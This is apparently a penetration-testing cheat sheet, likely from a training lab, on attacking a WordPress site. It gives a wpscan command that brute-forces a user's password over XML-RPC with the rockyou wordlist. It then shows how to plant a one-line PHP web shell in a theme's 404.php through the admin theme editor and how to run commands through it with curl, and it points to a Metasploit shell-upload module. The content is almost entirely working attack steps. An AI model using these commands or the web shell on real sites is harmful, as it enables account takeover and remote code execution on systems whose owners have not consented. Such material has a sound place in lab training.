## Login Brute Force
#### XMLRPC
```shell
sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
```
## Code Execution (Admin Access)
Click on `Apparance` on the side panel and select Theme Editor.
Click on `Select` after selecting the theme, and we can edit an uncommon page such as `404.php` to add a web shell.
```php
system($_GET[0]);
```

Access:
```shell
curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id
```
The [wp_admin_shell_upload](https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_admin_shell_upload/) module from Metasploit can be used to upload a shell and execute it automatically.
